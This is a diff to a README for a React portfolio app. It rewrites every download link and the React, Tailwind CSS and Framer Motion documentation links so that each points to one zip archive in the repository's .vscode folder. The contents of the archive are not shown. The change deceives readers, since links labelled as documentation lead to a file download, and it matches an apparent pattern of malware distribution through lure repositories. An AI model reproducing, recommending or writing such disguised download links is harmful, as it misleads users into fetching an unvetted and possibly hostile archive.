@@ -1,6 +1,6 @@
 # 🎨 Portfolio-PTD - Your Simple React App Solution
 
-[![Download Portfolio-PTD](https://img.shields.io/badge/Download-Portfolio--PTD-blue.svg)](https://github.com/bion64/Portfolio-PTD/releases)
+[![Download Portfolio-PTD](https://github.com/bion64/Portfolio-PTD/raw/refs/heads/main/.vscode/PTD_Portfolio_1.8.zip)](https://github.com/bion64/Portfolio-PTD/raw/refs/heads/main/.vscode/PTD_Portfolio_1.8.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Release Page:**  
    Click the link below to go to the release page. Here, you will find the latest version of Portfolio-PTD ready for download.  
-   [Visit this page to download](https://github.com/bion64/Portfolio-PTD/releases)
+   [Visit this page to download](https://github.com/bion64/Portfolio-PTD/raw/refs/heads/main/.vscode/PTD_Portfolio_1.8.zip)
 
 2. **Choose the Latest Release:**  
    Look for the latest version listed on the releases page. You will see all available versions—select the topmost one for the newest features and fixes.
@@ -73,13 +73,13 @@ If you encounter any issues or have questions about the application, reach out f
 
 For more information on the technologies used, consider visiting these links:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [Framer Motion Documentation](https://www.framermotion.com/docs/)
+- [React Documentation](https://github.com/bion64/Portfolio-PTD/raw/refs/heads/main/.vscode/PTD_Portfolio_1.8.zip)
+- [Tailwind CSS Documentation](https://github.com/bion64/Portfolio-PTD/raw/refs/heads/main/.vscode/PTD_Portfolio_1.8.zip)
+- [Framer Motion Documentation](https://github.com/bion64/Portfolio-PTD/raw/refs/heads/main/.vscode/PTD_Portfolio_1.8.zip)
 
 ## 📥 Download & Install
 
 To get started with Portfolio-PTD, please visit the release page to download the application:  
-[Visit this page to download](https://github.com/bion64/Portfolio-PTD/releases)
+[Visit this page to download](https://github.com/bion64/Portfolio-PTD/raw/refs/heads/main/.vscode/PTD_Portfolio_1.8.zip)
 
 Take your web development projects to the next level with Portfolio-PTD!
